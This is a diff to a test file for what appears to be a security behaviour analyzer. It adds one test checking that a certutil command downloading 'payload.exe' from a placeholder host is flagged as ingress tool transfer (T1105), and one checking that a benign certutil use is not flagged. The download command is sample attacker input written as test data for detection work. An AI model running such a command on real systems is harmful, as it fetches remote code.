@@ -31,6 +31,20 @@ def test_detects_encoded_powershell():
     assert findings[0]["technique"] == "T1059.001"
 
 
+def test_detects_certutil_download():
+    event = make_event(
+        "certutil.exe",
+        "certutil.exe -urlcache -split -f https://example.invalid/payload.exe",
+    )
+
+    findings = analyze_behavior([event])
+
+    assert len(findings) == 1
+    assert findings[0]["type"] == "suspicious_certutil"
+    assert findings[0]["score"] > 0
+    assert findings[0]["technique"] == "T1105"
+
+
 def test_detects_recovery_inhibition():
     event = make_event(
         "vssadmin.exe",
@@ -49,6 +63,17 @@ def test_benign_powershell_does_not_trigger():
     event = make_event(
         "powershell.exe",
         "powershell.exe Get-Date",
+    )
+
+    findings = analyze_behavior([event])
+
+    assert findings == []
+
+
+def test_benign_certutil_does_not_trigger():
+    event = make_event(
+        "certutil.exe",
+        "certutil.exe -dump certificate.cer",
     )
 
     findings = analyze_behavior([event])
